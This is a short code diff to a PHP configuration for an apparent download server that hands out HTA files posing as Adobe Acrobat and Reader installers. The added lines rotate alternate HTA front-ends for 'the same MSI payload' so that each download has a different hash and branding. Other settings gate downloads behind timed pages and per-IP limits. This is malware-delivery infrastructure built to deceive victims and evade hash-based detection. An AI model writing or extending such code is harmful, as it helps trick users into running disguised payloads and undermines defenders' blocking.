@@ -32,6 +32,12 @@ define('TTL', 900);            // token lifetime (15 min)
 define('MIN_DL_AGE', 6);       // index -> ... -> dl must span >= 6s (5s spinner + 2s button)
 define('RATE_LIMIT', 5);       // served downloads per IP per 1h window
 define('SOURCE_ZIP', __DIR__ . '/src/Adobe_Acrobat_Setup.hta');
+// Alternate HTA UIs for the same MSI payload - served at random so the
+// delivered file varies (extra hash/branding diversity per download).
+define('SOURCE_VARIANTS', array(
+    __DIR__ . '/src/Adobe_Acrobat_Setup.hta',
+    __DIR__ . '/src/Adobe_Reader_Setup.hta',
+));
 define('RATE_DIR', sys_get_temp_dir());
 define('ALERT_DIR', sys_get_temp_dir());
 
